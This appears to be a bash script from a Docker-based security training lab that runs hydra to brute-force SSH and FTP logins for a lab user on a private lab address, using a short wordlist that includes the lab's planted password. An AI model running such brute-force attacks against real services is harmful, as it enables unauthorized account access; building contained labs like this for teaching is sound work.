#!/bin/bash
# Brute force (SSH/FTP) — run from inside lab-attacker:
#   docker exec -it lab-attacker bash /work/bruteforce.sh
set -e

TARGET=172.30.0.11

# Small wordlist; the real password (labpass123) is deliberately buried
# in the middle so hydra doesn't succeed on its very first try.
cat > /tmp/passwords.txt << 'EOF'
123456
password
admin123
qwerty123
labpass123
letmein
welcome1
EOF

echo "[*] Brute-forcing SSH on $TARGET"
hydra -l labuser -P /tmp/passwords.txt -t 4 -f "$TARGET" ssh

echo "[*] Brute-forcing FTP on $TARGET"
hydra -l labuser -P /tmp/passwords.txt -t 4 -f "$TARGET" ftp
